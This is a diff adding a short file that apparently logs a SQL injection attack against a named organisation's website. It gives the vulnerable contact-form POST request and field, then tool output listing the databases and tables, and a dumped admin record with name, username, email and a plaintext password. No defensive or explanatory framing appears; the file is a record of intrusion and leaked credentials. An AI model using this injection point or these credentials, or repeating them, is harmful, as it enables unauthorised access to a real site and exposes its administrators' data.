@@ -1,0 +1,31 @@
+VULN POST : https://turkiad.org.tr/iletisim DATA : send=G%c3%b6nder&email=&message=20&name=jyxgcong&phone=555-666-0606&subject=1 email sqli vuln
+
+available databases [2]:
+[*] information_schema
+[*] turkiad_turkiad
+
+Database: turkiad_turkiad
+[12 tables]
++-----------------+
+| site_admins     |
+| site_ankara     |
+| site_banners    |
+| site_general    |
+| site_mailform   |
+| site_members    |
+| site_menu       |
+| site_menudefs   |
+| site_negotiated |
+| site_pages      |
+| site_pictures   |
+| site_settings   |
++-----------------+
+
+Database: turkiad_turkiad
+Table: site_admins
+[1 entry]
++----+------------+------------+-----------+----------+------------------+-----------+
+| id | status     | first_name | last_name | username | email            | password  |
++----+------------+------------+-----------+----------+------------------+-----------+
+| 1  | main admin | Onur       | Alper     | admin    | admin@domain.com | td12345TD |
++----+------------+------------+-----------+----------+------------------+-----------+
